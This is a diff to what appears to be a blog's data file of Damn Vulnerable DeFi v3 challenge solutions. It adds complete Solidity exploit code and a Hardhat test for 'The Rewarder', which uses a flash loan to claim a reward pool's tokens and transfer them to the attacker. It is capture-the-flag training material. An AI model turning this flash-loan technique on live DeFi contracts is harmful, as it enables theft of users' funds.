@@ -2,7 +2,7 @@ export default {
     posts: [
         {
             id: "damn-vulnerable-defi-solutions-1-unstoppable",
-            title: `Damn Vulnerable DeFi v3 Solutions 1: Unstoppable`,
+            title: `Damn Vulnerable DeFi V3 Solutions: Unstoppable`,
             description: `Solution for the 1st Damn Vulnerable DeFi v3 challenge.`,
             date: "May 30, 2023",
             snippets: [
@@ -14,7 +14,7 @@ export default {
         },
         {
             id: "damn-vulnerable-defi-solutions-2-naive-receiver",
-            title: `Damn Vulnerable DeFi v3 Solutions 2: Naive Receiver`,
+            title: `Damn Vulnerable DeFi V3 Solutions: Naive Receiver`,
             description: `Solution for the 2nd Damn Vulnerable DeFi v3 challenge.`,
             date: "June 1, 2023",
             snippets: [
@@ -55,9 +55,9 @@ contract Exploit_NaiveReceiver {
         },
         {
             id: "damn-vulnerable-defi-solutions-3-truster",
-            title: `Damn Vulnerable DeFi v3 Solutions 3: Truster`,
+            title: `Damn Vulnerable DeFi V3 Solutions: Truster`,
             description: `Solution for the 3rd Damn Vulnerable DeFi v3 challenge.`,
-            date: "January 12, 2023",
+            date: "June 2, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
 
@@ -102,9 +102,9 @@ contract Exploit_Truster {
         },
         {
             id: "damn-vulnerable-defi-solutions-4-side-entrance",
-            title: `Damn Vulnerable DeFi v3 Solutions 4: Side Entrance`,
+            title: `Damn Vulnerable DeFi V3 Solutions: Side Entrance`,
             description: `Solution for the 4th Damn Vulnerable DeFi v3 challenge.`,
-            date: "January 12, 2023",
+            date: "June 3, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
 
@@ -151,6 +151,85 @@ contract Exploit_SideEntrance {
     ).deploy(pool.address);
 
     await attacker.exploit(player.address);
+});`,
+            ],
+        },
+        {
+            id: "damn-vulnerable-defi-solutions-5-the-rewarder",
+            title: `Damn Vulnerable DeFi V3 Solutions: The Rewarder`,
+            description: `Solution for the 5th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 5, 2023",
+            snippets: [
+                `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+interface ITheRewarderPool {
+    function deposit(uint256 amount) external;
+
+    function withdraw(uint256 amount) external;
+}
+
+interface IFlashLoanerPool {
+    function flashLoan(uint256 amount) external;
+}
+
+contract Exploit_TheRewarder {
+    address attackerEOA;
+    IERC20 liquidityToken;
+    IERC20 rewardToken;
+    ITheRewarderPool rewardPool;
+    IFlashLoanerPool flashLoanPool;
+
+    constructor(
+        address _attackerEOA,
+        IERC20 _liquidityToken,
+        IERC20 _rewardToken,
+        ITheRewarderPool _rewardPool,
+        IFlashLoanerPool _flashLoanPool
+    ) {
+        attackerEOA = _attackerEOA;
+        liquidityToken = _liquidityToken;
+        rewardToken = _rewardToken;
+        rewardPool = _rewardPool;
+        flashLoanPool = _flashLoanPool;
+    }
+
+    function exploit() public {
+        uint256 amount = liquidityToken.balanceOf(address(flashLoanPool));
+        flashLoanPool.flashLoan(amount);
+    }
+
+    //callback IFlashLoanerPool:flashLoan()
+    function receiveFlashLoan(uint256 amount) public {
+        liquidityToken.approve(address(rewardPool), amount);
+
+        rewardPool.deposit(amount);
+        rewardPool.withdraw(amount);
+
+        uint256 stolenReward = rewardToken.balanceOf(address(this));
+        require(stolenReward > 0, "Could not steal the funds.");
+        rewardToken.transfer(attackerEOA, stolenReward);
+
+        //return the flash loan
+        liquidityToken.transfer(address(flashLoanPool), amount);
+    }
+}`,
+                `it("Exploit", async function () {
+    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+    attacker = await (
+        await ethers.getContractFactory("Exploit_TheRewarder", player)
+    ).deploy(
+        player.address,
+        liquidityToken.address,
+        rewardToken.address,
+        rewarderPool.address,
+        flashLoanPool.address
+    );
+
+    await attacker.exploit();
 });`,
             ],
         },
